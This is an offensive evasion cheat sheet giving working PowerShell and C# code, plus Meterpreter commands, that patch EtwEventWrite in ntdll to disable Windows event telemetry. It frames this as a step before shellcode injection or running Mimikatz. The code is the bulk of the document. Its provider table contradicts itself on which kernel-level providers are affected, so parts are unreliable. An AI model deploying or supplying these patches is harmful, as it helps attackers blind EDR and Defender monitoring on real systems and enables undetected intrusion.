# ETW Patching — Blind Windows Event Tracing

ETW (Event Tracing for Windows) is the mechanism that EDR and Windows Defender use to observe process behavior in user mode. Patching `EtwEventWrite` in `ntdll.dll` causes the current process to stop emitting telemetry events to any listening ETW provider (including WD ATP, Sysmon, etc.).

**Scope:** User-mode only. Does NOT affect kernel-mode ETW (requires a driver for that).
**When to use:** Before injecting shellcode, loading Mimikatz, or performing other high-detection operations.

---

## Method 1: PowerShell Patch (No Compilation Required)

```powershell
# Patch EtwEventWrite with a RET instruction (0xC3):
$null = [Reflection.Assembly]::LoadWithPartialName('Microsoft.CSharp')
$refs = [System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {$_.FullName -match 'System.Core'}

# Define patcher:
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class ETW {
    [DllImport("ntdll.dll")]
    static extern IntPtr NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref UIntPtr NumberOfBytesToProtect, uint NewAccessProtection, out uint OldAccessProtection);

    public static void Patch() {
        IntPtr pAddr = GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");
        uint oldProtect;
        IntPtr baseAddr = pAddr;
        UIntPtr size = (UIntPtr)4;
        // RWX the page:
        System.Diagnostics.Process.GetCurrentProcess();
        VirtualProtect(pAddr, 4, 0x40, out oldProtect);
        // Write RET (0xC3):
        Marshal.WriteByte(pAddr, 0xC3);
        // Restore protection:
        VirtualProtect(pAddr, 4, oldProtect, out oldProtect);
    }

    [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll")] static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

[ETW]::Patch()
Write-Host "[+] ETW patched"
```

---

## Method 2: C# Inline Patch (For Loaders)

Add this before your main payload execution in any C# loader:

```csharp
// ETW Patch — add to loader before shellcode execution
using System;
using System.Runtime.InteropServices;

class ETWBypass {
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static void Patch() {
        IntPtr ntdll = GetModuleHandle("ntdll.dll");
        IntPtr etwAddr = GetProcAddress(ntdll, "EtwEventWrite");

        uint oldProt;
        VirtualProtect(etwAddr, 4, 0x40, out oldProt);  // PAGE_EXECUTE_READWRITE
        Marshal.WriteByte(etwAddr, 0xC3);                // RET instruction
        VirtualProtect(etwAddr, 4, oldProt, out oldProt); // Restore
    }
}

// In your Main():
ETWBypass.Patch();
// ... then execute shellcode
```

---

## Method 3: Meterpreter Command (From Existing Session)

```
meterpreter> run post/windows/manage/etw_disable
# OR from the PS shell in Meterpreter:
meterpreter> load powershell
meterpreter> powershell_execute "[ETW]::Patch()"  # after defining the class above
```

---

## PowerShell AMSI + ETW Combined Bypass

Before running any PS-based tooling, blind both:

```powershell
# 1. Patch AMSI (see 01-evasion/amsi-bypass/)
# 2. Patch ETW:
$addr = (Get-Process -Id $pid).Modules | Where-Object {$_.ModuleName -eq "ntdll.dll"} | Select -ExpandProperty BaseAddress
# More reliable method:
$hNtdll = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE([System.Reflection.Assembly]::LoadWithPartialName('ntdll'))
# Use the Add-Type approach from Method 1 for reliability
```

---

## What ETW Patching Blocks

| Provider | What It Reports |
|----------|----------------|
| Microsoft-Windows-Threat-Intelligence (MWTI) | Process injection, memory writes |
| Microsoft-Windows-PowerShell | PS commands and script blocks |
| Microsoft-Antimalware-Scan-Interface | AMSI scan results (complements AMSI bypass) |
| Microsoft-Windows-Security-Auditing | Some auth events |
| WD ATP / CrowdStrike hooks | EDR behavioral telemetry |

**Does NOT block:**
- Kernel ETW providers (needs driver/kernel exploit)
- Network telemetry (separate layer)
- Sysmon event log entries (uses kernel ETW)
- Windows Event Log entries (separate mechanism)
